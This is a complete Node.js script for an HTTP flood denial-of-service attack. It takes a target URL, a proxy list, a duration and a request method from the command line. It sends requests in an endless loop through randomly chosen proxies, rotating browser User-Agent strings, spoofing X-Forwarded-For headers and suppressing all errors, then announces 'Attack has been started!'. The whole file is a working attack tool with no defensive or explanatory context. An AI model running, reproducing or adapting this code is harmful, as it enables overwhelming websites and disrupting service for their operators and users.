const request = require('request');
const fs = require('fs');
const proxies = fs.readFileSync(process.argv[3], 'utf-8').match(/\S+/g);
process.on('uncaughtException', (err) => { });
process.on('unhandledRejection', (err) => { });
const UAs = [
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
];
setTimeout(() => { process.exit(1); }, process.argv[4] * 1000);
function Send() {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    request({
        method: process.argv[5],
        url: process.argv[2],
        headers: 
        { 
            "Referer" : process.argv[2],
            "Accept" : "*/*",
            "User-Agent" : UAs[Math.floor(Math.random() * UAs.length)],
            "Upgrade-Insecure-Requests" : "1",
            "Accept-Encoding" : "gzip, deflate",
            "Accept-Language" : "en-US,en;q=0.9",
            "Cache-Control" : "max-age=0",
            "Via" : "1.0 PROXY",
            "Connection" : "keep-alive",
            "X-Forwarded-For" : proxy.split(':')[0]
        },
        proxy: 'http://' + proxy
    }, function (error, response, body) { });
}
setInterval(() => { Send(); });
console.log("Attack has been started!")
